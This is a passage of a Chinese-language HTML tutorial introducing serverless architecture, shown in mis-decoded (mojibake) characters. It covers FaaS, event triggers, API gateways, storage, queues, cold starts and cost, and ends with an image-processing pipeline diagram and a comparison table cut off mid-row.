¸å¿ƒæ¦‚å¿µï¼Œæ‹’ç»çƒ§è„‘ï¼Œä¸»æ‰“è½»æ¾æ˜“æ‡‚ã€‚æˆ‘ä»¬å°† Serverless çš„å­¦ä¹ ä¹‹æ—…åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š<strong>ç†å¿µã€æ ¸å¿ƒæœåŠ¡ã€å®æˆ˜æ¨¡å¼</strong>ã€‚è®©æˆ‘ä»¬è·Ÿéš Gopher çš„è„šæ­¥ï¼Œä¸€èµ·æ¢ç´¢"æ— æœåŠ¡å™¨"çš„ä¸–ç•Œå§ï¼</p>
<hr/>
<h2 data-id="heading-0">ç¬¬ä¸€éƒ¨åˆ†ï¼šç†å¿µç¯‡ (The Philosophy)</h2>
<p>åœ¨å¼€å§‹å†™ä»£ç ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆç†è§£ Serverless çš„æœ¬è´¨ã€‚å®ƒä¸æ˜¯"æ²¡æœ‰æœåŠ¡å™¨"ï¼Œè€Œæ˜¯"ä¸ç”¨ç®¡æœåŠ¡å™¨"ã€‚</p>
<h3 data-id="heading-1">â‘  ä¸ºä»€ä¹ˆéœ€è¦ Serverless æ¶æ„ï¼Ÿ</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šServerless æ˜¯ç”¨æŒ‰éœ€è®¡ç®—å¯¹æŠ—è¿ç»´å¤æ‚æ€§çš„æ¶æ„æ–¹æ³•ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
è®©å¼€å‘è€…åªå…³æ³¨ä¸šåŠ¡ä»£ç ï¼Œè€Œå°†æœåŠ¡å™¨ç®¡ç†ã€æ‰©å®¹ã€å®¹é”™ç­‰åŸºç¡€è®¾æ–½å·¥ä½œå®Œå…¨äº¤ç»™äº‘å¹³å°ã€‚ä½ åªéœ€ä¸Šä¼ ä»£ç ï¼Œå¹³å°è‡ªåŠ¨è¿è¡Œã€æ‰©å±•å’Œè®¡è´¹ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
ä¼ ç»Ÿæ¶æ„ä¸­ï¼Œå¼€å‘è€…éœ€è¦é¢„ä¼°æµé‡ã€è´­ä¹°æœåŠ¡å™¨ã€é…ç½®ç¯å¢ƒã€ç›‘æ§æ€§èƒ½ã€å¤„ç†æ‰©å®¹ã€‚è¿™äº›è¿ç»´å·¥ä½œå æ®äº†å¤§é‡æ—¶é—´ï¼Œè€Œä¸”èµ„æºåˆ©ç”¨ç‡ä½ï¼ˆé—²æ—¶æµªè´¹ï¼Œå¿™æ—¶ä¸å¤Ÿï¼‰ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3252d79240a4713ba29024e85b21c8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=qUadTRX76lTJUsSxG7GsBTAomwk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">â‘¡ FaaSï¼ˆå‡½æ•°å³æœåŠ¡ï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šFaaS æ˜¯ Serverless çš„æ ¸å¿ƒè®¡ç®—æ¨¡å‹ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
å°†åº”ç”¨æ‹†åˆ†ä¸ºç‹¬ç«‹çš„å‡½æ•°ï¼ˆFunctionï¼‰ï¼Œæ¯ä¸ªå‡½æ•°å“åº”ç‰¹å®šäº‹ä»¶ï¼ˆHTTP è¯·æ±‚ã€å®šæ—¶ä»»åŠ¡ã€æ¶ˆæ¯é˜Ÿåˆ—ç­‰ï¼‰ã€‚å‡½æ•°æŒ‰éœ€æ‰§è¡Œï¼Œæ‰§è¡Œå®Œç«‹å³é‡Šæ”¾èµ„æºã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
FaaS å®ç°äº†çœŸæ­£çš„"æŒ‰éœ€è®¡ç®—"ã€‚ä½ ä¸éœ€è¦ä¸ºç©ºé—²æ—¶é—´ä»˜è´¹ï¼Œä¹Ÿä¸éœ€è¦æ‹…å¿ƒæµé‡çªå¢ï¼Œå¹³å°ä¼šè‡ªåŠ¨æ‰©å±•åˆ°æˆåƒä¸Šä¸‡ä¸ªå®ä¾‹ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c23ac66fd8994efc88ae76fbbd0a2afa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=0hz9c7i2SuUHONuVo9iC%2FjJofhk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">â‘¢ äº‹ä»¶é©±åŠ¨è§¦å‘</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šServerless å‡½æ•°ç”±äº‹ä»¶è§¦å‘æ‰§è¡Œã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
å‡½æ•°ä¸æ˜¯ä¸€ç›´è¿è¡Œçš„æœåŠ¡ï¼Œè€Œæ˜¯è¢«äº‹ä»¶å”¤é†’ï¼šHTTP è¯·æ±‚ã€æ–‡ä»¶ä¸Šä¼ ã€æ•°æ®åº“å˜æ›´ã€å®šæ—¶å™¨ã€æ¶ˆæ¯é˜Ÿåˆ—ç­‰ã€‚äº‹ä»¶åˆ°è¾¾æ—¶ï¼Œå¹³å°è‡ªåŠ¨å¯åŠ¨å‡½æ•°å®ä¾‹å¤„ç†ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
äº‹ä»¶é©±åŠ¨æ˜¯ Serverless çš„çµé­‚ã€‚å®ƒè®©å‡½æ•°çœŸæ­£åšåˆ°"ç”¨æ—¶å³æ¥ï¼Œç”¨å®Œå³èµ°"ï¼Œå®ç°æè‡´çš„èµ„æºåˆ©ç”¨ç‡å’Œæˆæœ¬ä¼˜åŒ–ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/993d15e620fa4d09b6e3236113f086a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=snYVJ1O8mQgqje5u2NWzHBW3tQw%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">ç¬¬äºŒéƒ¨åˆ†ï¼šæ ¸å¿ƒæœåŠ¡ç¯‡ (Core Services)</h2>
<p>ç†è§£äº† Serverless çš„ç†å¿µåï¼Œæˆ‘ä»¬éœ€è¦äº†è§£æ„å»º Serverless åº”ç”¨çš„æ ¸å¿ƒæœåŠ¡ã€‚</p>
<h3 data-id="heading-5">â‘£ API ç½‘å…³ï¼ˆAPI Gatewayï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šAPI ç½‘å…³æ˜¯ Serverless åº”ç”¨çš„ç»Ÿä¸€å…¥å£ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
API ç½‘å…³æ¥æ”¶ HTTP è¯·æ±‚ï¼Œè·¯ç”±åˆ°å¯¹åº”çš„å‡½æ•°ï¼Œå¹¶è¿”å›å“åº”ã€‚å®ƒè¿˜æä¾›è®¤è¯ã€é™æµã€ç¼“å­˜ã€æ—¥å¿—ç­‰åŠŸèƒ½ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
å‡½æ•°æœ¬èº«æ²¡æœ‰å›ºå®šçš„ URLï¼ŒAPI ç½‘å…³ä¸ºå‡½æ•°æä¾›ç¨³å®šçš„ RESTful æˆ– GraphQL æ¥å£ï¼Œæ˜¯ Serverless åº”ç”¨å¯¹å¤–çš„"é—¨é¢"ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3281f89d9fdc4db3a113c6b25d273bee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=mhB1kmM2rNlUscR1Vp5QmVCJYb4%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-6">â‘¤ å¯¹è±¡å­˜å‚¨ï¼ˆObject Storageï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šå¯¹è±¡å­˜å‚¨æ˜¯ Serverless åº”ç”¨çš„æŒä¹…åŒ–å±‚ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
äº‘ç«¯çš„æ–‡ä»¶å­˜å‚¨æœåŠ¡ï¼ˆå¦‚ AWS S3ã€é˜¿é‡Œäº‘ OSSï¼‰ï¼Œç”¨äºå­˜å‚¨é™æ€æ–‡ä»¶ã€ç”¨æˆ·ä¸Šä¼ ã€æ—¥å¿—ç­‰ã€‚æ”¯æŒæ— é™æ‰©å±•ï¼ŒæŒ‰ä½¿ç”¨é‡è®¡è´¹ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
Serverless å‡½æ•°æ˜¯æ— çŠ¶æ€çš„ï¼Œæ‰§è¡Œå®Œåæ‰€æœ‰ä¸´æ—¶æ•°æ®éƒ½ä¼šä¸¢å¤±ã€‚å¯¹è±¡å­˜å‚¨æä¾›äº†å¯é ã€å»‰ä»·çš„æŒä¹…åŒ–æ–¹æ¡ˆï¼Œè€Œä¸”å¯ä»¥è§¦å‘å‡½æ•°ï¼ˆæ–‡ä»¶ä¸Šä¼ äº‹ä»¶ï¼‰ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68d82d56660b44c98665dd0ff94c64fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=89pWh8Czoyue7kBXy0HFLa2uu2Q%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">â‘¥ æ‰˜ç®¡æ•°æ®åº“ï¼ˆManaged Databaseï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šæ‰˜ç®¡æ•°æ®åº“æä¾› Serverless åŒ–çš„æ•°æ®å­˜å‚¨ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
äº‘å¹³å°æä¾›çš„æ•°æ®åº“æœåŠ¡ï¼ˆå¦‚ DynamoDBã€Aurora Serverlessã€Firestoreï¼‰ï¼Œè‡ªåŠ¨æ‰©å±•ã€è‡ªåŠ¨å¤‡ä»½ã€æŒ‰è¯·æ±‚è®¡è´¹ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
ä¼ ç»Ÿæ•°æ®åº“éœ€è¦é¢„é…ç½®å®¹é‡ã€ç®¡ç†è¿æ¥æ± ã€å¤„ç†æ‰©å®¹ã€‚æ‰˜ç®¡æ•°æ®åº“ä¸ Serverless ç†å¿µä¸€è‡´ï¼Œè®©å¼€å‘è€…åªå…³æ³¨æ•°æ®æ¨¡å‹ï¼Œä¸å…³å¿ƒåº•å±‚è¿ç»´ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1b226f07b36448c857eb2a1705b65df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=nZDC83U%2FejpiGU0gEn4ytDl5ERM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">â‘¦ æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMessage Queueï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šæ¶ˆæ¯é˜Ÿåˆ—å®ç° Serverless å‡½æ•°é—´çš„å¼‚æ­¥é€šä¿¡ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
æ‰˜ç®¡çš„æ¶ˆæ¯æœåŠ¡ï¼ˆå¦‚ AWS SQSã€Azure Queueï¼‰ï¼Œå‡½æ•°å¯ä»¥å‘é€æ¶ˆæ¯åˆ°é˜Ÿåˆ—ï¼Œå…¶ä»–å‡½æ•°è®¢é˜…é˜Ÿåˆ—å¹¶å¼‚æ­¥å¤„ç†ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
Serverless å‡½æ•°æœ‰æ‰§è¡Œæ—¶é—´é™åˆ¶ï¼ˆé€šå¸¸å‡ åˆ†é’Ÿï¼‰ã€‚å¯¹äºé•¿æ—¶é—´ä»»åŠ¡ï¼Œå¯ä»¥æ‹†åˆ†ä¸ºå¤šä¸ªå‡½æ•°ï¼Œé€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—ä¸²è”ï¼Œå®ç°å¼‚æ­¥å·¥ä½œæµã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e331386641d54dcba39654527bff2305~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=flBqa0JQmqzAsS1uZQp5swOyMME%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">â‘§ å®šæ—¶ä»»åŠ¡ï¼ˆScheduled Tasksï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šå®šæ—¶è§¦å‘å‡½æ•°æ‰§è¡Œã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
é€šè¿‡ Cron è¡¨è¾¾å¼å®šä¹‰æ‰§è¡Œè®¡åˆ’ï¼Œå¹³å°è‡ªåŠ¨åœ¨æŒ‡å®šæ—¶é—´è§¦å‘å‡½æ•°ã€‚ä¾‹å¦‚ï¼šæ¯å¤©å‡Œæ™¨ 2 ç‚¹æ‰§è¡Œæ•°æ®å¤‡ä»½ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
å¾ˆå¤šä¸šåŠ¡éœ€è¦å®šæœŸæ‰§è¡Œï¼ˆæŠ¥è¡¨ç”Ÿæˆã€æ•°æ®æ¸…ç†ã€å¥åº·æ£€æŸ¥ï¼‰ã€‚Serverless çš„å®šæ—¶ä»»åŠ¡æ— éœ€ç»´æŠ¤å¸¸é©»è¿›ç¨‹ï¼ŒæŒ‰æ‰§è¡Œæ¬¡æ•°è®¡è´¹ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0068a7a5e55e46a780c69aa1df78bff4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=mfFu7gF%2FRKz%2F4CK39v1%2BkYYFaGg%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-10">â‘¨ æ—¥å¿—ä¸ç›‘æ§ï¼ˆLogging &amp; Monitoringï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šå¯è§‚æµ‹æ€§æ˜¯ Serverless åº”ç”¨çš„ç”Ÿå‘½çº¿ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
äº‘å¹³å°è‡ªåŠ¨æ”¶é›†å‡½æ•°çš„æ—¥å¿—ã€æŒ‡æ ‡ï¼ˆæ‰§è¡Œæ—¶é—´ã€é”™è¯¯ç‡ã€å¹¶å‘æ•°ï¼‰å’Œé“¾è·¯è¿½è¸ªï¼Œæä¾›å¯è§†åŒ–ç›‘æ§é¢æ¿ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
Serverless å‡½æ•°æ˜¯çŸ­æš‚çš„ã€åˆ†å¸ƒå¼çš„ï¼Œä¼ ç»Ÿçš„æ—¥å¿—æ–‡ä»¶ä¸é€‚ç”¨ã€‚æ‰˜ç®¡çš„æ—¥å¿—å’Œç›‘æ§æœåŠ¡è®©ä½ èƒ½å¤Ÿå®æ—¶äº†è§£ç³»ç»Ÿå¥åº·çŠ¶å†µï¼Œå¿«é€Ÿå®šä½é—®é¢˜ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3492a18be9249f7a770e69eafe6e596~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=rW6rzdyMqPHfbqlttQKiYhDyXuE%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-11">ç¬¬ä¸‰éƒ¨åˆ†ï¼šå®æˆ˜æ¨¡å¼ç¯‡ (Practical Patterns)</h2>
<p>å½“æ„å»ºçœŸå®çš„ Serverless åº”ç”¨æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¸€äº›ç»è¿‡éªŒè¯çš„æ¨¡å¼æ¥åº”å¯¹æŒ‘æˆ˜ã€‚</p>
<h3 data-id="heading-12">â‘© å†·å¯åŠ¨ä¼˜åŒ–ï¼ˆCold Start Optimizationï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šå‡å°‘å‡½æ•°é¦–æ¬¡å¯åŠ¨çš„å»¶è¿Ÿã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
å½“å‡½æ•°é•¿æ—¶é—´æœªæ‰§è¡Œæ—¶ï¼Œå¹³å°ä¼šå›æ”¶èµ„æºã€‚ä¸‹æ¬¡è¯·æ±‚åˆ°è¾¾æ—¶éœ€è¦é‡æ–°åˆå§‹åŒ–ï¼ˆå†·å¯åŠ¨ï¼‰ï¼Œå¯èƒ½è€—æ—¶å‡ ç§’ã€‚ä¼˜åŒ–æ–¹æ³•åŒ…æ‹¬ï¼šé¢„çƒ­ã€å‡å°ä»£ç åŒ…ã€ä½¿ç”¨è½»é‡çº§è¿è¡Œæ—¶ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
å†·å¯åŠ¨æ˜¯ Serverless çš„ä¸»è¦ç—›ç‚¹ã€‚å¯¹äºå»¶è¿Ÿæ•æ„Ÿçš„åº”ç”¨ï¼ˆå¦‚ Web APIï¼‰ï¼Œå†·å¯åŠ¨ä¼šå½±å“ç”¨æˆ·ä½“éªŒã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e5943707fc0436ab26ceef1225d4932~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=y1nt%2B2RdvGh3u7e3XIhEfQLYeyE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-13">â‘ª å‡½æ•°ç¼–æ’ï¼ˆFunction Orchestrationï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šåè°ƒå¤šä¸ªå‡½æ•°å®Œæˆå¤æ‚å·¥ä½œæµã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
ä½¿ç”¨ç¼–æ’æœåŠ¡ï¼ˆå¦‚ AWS Step Functionsï¼‰å®šä¹‰å‡½æ•°æ‰§è¡Œçš„é¡ºåºã€æ¡ä»¶ã€å¹¶è¡Œã€é‡è¯•ç­‰é€»è¾‘ï¼Œæ„å»ºå¯é çš„ä¸šåŠ¡æµç¨‹ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
å•ä¸ªå‡½æ•°åº”è¯¥ä¿æŒç®€å•ï¼Œå¤æ‚ä¸šåŠ¡éœ€è¦å¤šä¸ªå‡½æ•°åä½œã€‚ç¼–æ’æœåŠ¡æä¾›äº†å¯è§†åŒ–çš„å·¥ä½œæµå®šä¹‰ï¼Œå¤„ç†é”™è¯¯é‡è¯•ã€çŠ¶æ€ç®¡ç†ç­‰å¤æ‚é—®é¢˜ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51d01a9219c6419f93e1ed5d6ebf61ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=7n8%2FGsX5Ll40tLic5y59lXC%2BD3s%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-14">â‘« æˆæœ¬ä¼˜åŒ–ï¼ˆCost Optimizationï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šServerless æŒ‰ä½¿ç”¨é‡è®¡è´¹ï¼Œä½†ä¹Ÿå¯èƒ½äº§ç”Ÿæ„å¤–æˆæœ¬ã€‚</p>
<ul>
<li>
<p><strong>æ€ä¹ˆåšï¼Ÿ</strong><br/>
ä¼˜åŒ–ç­–ç•¥åŒ…æ‹¬ï¼šåˆç†è®¾ç½®å†…å­˜é…ç½®ã€é¿å…æ— é™å¾ªç¯ã€ä½¿ç”¨é¢„ç•™å®¹é‡ã€ç›‘æ§å¼‚å¸¸è°ƒç”¨ã€è®¾ç½®å¹¶å‘é™åˆ¶ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
è™½ç„¶ Serverless é€šå¸¸å¾ˆä¾¿å®œï¼Œä½†å¦‚æœé…ç½®ä¸å½“ï¼ˆå¦‚å†…å­˜è¿‡å¤§ã€è¢« DDoS æ”»å‡»ï¼‰ï¼Œæˆæœ¬å¯èƒ½å¤±æ§ã€‚æˆæœ¬ä¼˜åŒ–æ˜¯ Serverless åº”ç”¨çš„å¿…ä¿®è¯¾ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0547e7239c854c13be936733ab95b2d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=x9YRWVm4X6FybtE796TYUQq9KUA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-15">æ€»ç»“</h2>
<h3 data-id="heading-16">æ ¸å¿ƒå›é¡¾</h3>
<p><strong>ä¸€å¥è¯æ€»ç»“</strong>ï¼šServerless è®©å¼€å‘è€…ä»"ç®¡ç†æœåŠ¡å™¨"è§£æ”¾å‡ºæ¥ï¼Œä¸“æ³¨äº"åˆ›é€ ä»·å€¼"ã€‚</p>
<p><strong>æ ¸å¿ƒæ„ä¹‰</strong>ï¼š
æ‰€æœ‰ Serverless çš„æ¦‚å¿µï¼ˆFaaSã€äº‹ä»¶é©±åŠ¨ã€API ç½‘å…³ã€å¯¹è±¡å­˜å‚¨ã€æ‰˜ç®¡æ•°æ®åº“ã€å‡½æ•°ç¼–æ’ï¼‰éƒ½æ˜¯ä¸ºäº†å®ç°<strong>é›¶è¿ç»´ã€å¼¹æ€§æ‰©å±•ã€æŒ‰éœ€ä»˜è´¹</strong>çš„ç†æƒ³æ¶æ„ã€‚åªæœ‰æ‹¥æŠ± Serverlessï¼Œæ‰èƒ½çœŸæ­£åšåˆ°"å†™ä»£ç å°±å¤Ÿäº†"ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c074ecde35749cdb0d5dfae285e15e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=OGzwH8vxKdPji%2BswGWPz3I46nLY%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-17">é™„å½•ï¼šServerless å®æˆ˜æ¡ˆä¾‹</h2>
<h3 data-id="heading-18">å›¾ç‰‡å¤„ç†æœåŠ¡ï¼ˆServerless æ¶æ„ï¼‰</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    U[ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡] --&gt; S3[å¯¹è±¡å­˜å‚¨ S3]
    S3 --&gt;|è§¦å‘äº‹ä»¶| F1[ç¼©ç•¥å›¾ç”Ÿæˆå‡½æ•°]
    S3 --&gt;|è§¦å‘äº‹ä»¶| F2[æ°´å°æ·»åŠ å‡½æ•°]
    S3 --&gt;|è§¦å‘äº‹ä»¶| F3[æ ¼å¼è½¬æ¢å‡½æ•°]
    
    F1 --&gt; S3_Thumb[S3 ç¼©ç•¥å›¾ç›®å½•]
    F2 --&gt; S3_Water[S3 æ°´å°ç›®å½•]
    F3 --&gt; S3_Convert[S3 è½¬æ¢ç›®å½•]
    
    S3_Thumb --&gt; CDN[CDN åˆ†å‘]
    S3_Water --&gt; CDN
    S3_Convert --&gt; CDN
    
    F1 --&gt; DDB[DynamoDB å…ƒæ•°æ®]
    F2 --&gt; DDB
    F3 --&gt; DDB
    
    CDN --&gt; U2[ç”¨æˆ·è®¿é—®]
</code></pre>
<p><strong>æ¶æ„ç‰¹ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>é›¶è¿ç»´</strong>ï¼šæ— éœ€ç®¡ç†æœåŠ¡å™¨ï¼Œä¸Šä¼ ä»£ç å³å¯è¿è¡Œ</li>
<li><strong>äº‹ä»¶é©±åŠ¨</strong>ï¼šæ–‡ä»¶ä¸Šä¼ è‡ªåŠ¨è§¦å‘å¤„ç†å‡½æ•°</li>
<li><strong>å¼¹æ€§æ‰©å±•</strong>ï¼šå¹¶å‘ä¸Šä¼ æ—¶è‡ªåŠ¨æ‰©å±•åˆ°æ•°åƒå®ä¾‹</li>
<li><strong>æŒ‰éœ€ä»˜è´¹</strong>ï¼šåªä¸ºå®é™…æ‰§è¡Œæ—¶é—´å’Œå­˜å‚¨ç©ºé—´ä»˜è´¹</li>
<li><strong>é«˜å¯ç”¨</strong>ï¼šäº‘å¹³å°è‡ªåŠ¨å¤„ç†å®¹é”™å’Œé‡è¯•</li>
</ol>
<h3 data-id="heading-19">Serverless vs ä¼ ç»Ÿæ¶æ„å¯¹æ¯”</h3>








































<table><thead><tr><th>ç»´åº¦</th><th>ä¼ ç»Ÿæ¶æ„</th><th>Serverless æ¶æ„</th></tr></thead><tbody><tr><td><strong>è¿ç»´è´Ÿæ‹…</strong></td><td>éœ€è¦ç®¡ç†æœåŠ¡å™¨ã€é…ç½®ã€æ‰©å®¹</td><td>é›¶è¿ç»´ï¼Œå¹³å°è‡ªåŠ¨ç®¡ç†</td></tr><tr><td><strong>æ‰©å±•æ€§</strong></td><td>æ‰‹åŠ¨æˆ–è‡ªåŠ¨æ‰©å®¹ï¼Œæœ‰ä¸Šé™</td><td>è‡ªåŠ¨æ— 